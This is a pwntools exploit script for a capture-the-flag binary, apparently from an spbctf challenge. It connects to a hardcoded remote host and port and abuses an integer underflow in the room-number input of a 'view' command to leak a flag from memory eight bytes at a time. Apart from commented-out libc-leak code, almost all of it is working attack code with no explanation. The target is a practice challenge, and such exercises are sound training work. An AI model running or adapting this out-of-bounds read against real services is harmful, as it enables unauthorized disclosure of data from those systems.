#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./intunder_1.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11691)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()


flag_addr = 0x4048A0
rooms_addr = 0x4040A0

# io.sendline("order")
# io.sendline(str(-9223372036854775807))
# io.sendline("11111111")
flag = ""
for i in range(255):
    io.sendline("view")
    io.recvuntil("Enter room number\n")
    io.sendline(str(-9223372036854775807+ 255 + i))
    leaked_flag_part = io.recvline()
    if b"Empty room" in leaked_flag_part:
        break
    flag += p64(int(leaked_flag_part[len("Ordered by: "):-1],16)).decode()






# libc = ELF("libc_here")
# leak = io.recv().decode()
# LIBC_base = int(re.findall(r"([0-9a-f]+)\-[0-9a-f]+.*libc-2", leak)[0], 16)


# io.recvuntil("spbctf")
# flag = io.recvuntil("}").decode()
log.success(f"Flag: {flag}")

io.interactive()

#io.close()

